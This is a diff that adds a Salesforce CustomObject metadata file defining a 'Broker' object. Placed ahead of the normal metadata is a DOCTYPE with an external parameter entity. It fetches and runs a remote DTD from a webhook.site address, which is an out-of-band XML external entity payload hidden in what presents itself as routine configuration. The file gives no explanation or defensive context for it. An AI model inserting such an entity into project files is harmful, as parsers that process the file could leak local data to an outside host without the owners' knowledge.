@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE CustomObject [
+  <!ENTITY % p SYSTEM "https://webhook.site/7e290af6-a517-4435-b786-2305f49037f4/param-object">
+  %p;
+]>
+<CustomObject xmlns="http://soap.sforce.com/2006/04/metadata">
+    <deploymentStatus>Deployed</deploymentStatus>
+    <label>Broker</label>
+    <pluralLabel>Brokers</pluralLabel>
+    <nameField><label>Name</label><type>Text</type></nameField>
+    <sharingModel>ReadWrite</sharingModel>
+</CustomObject>
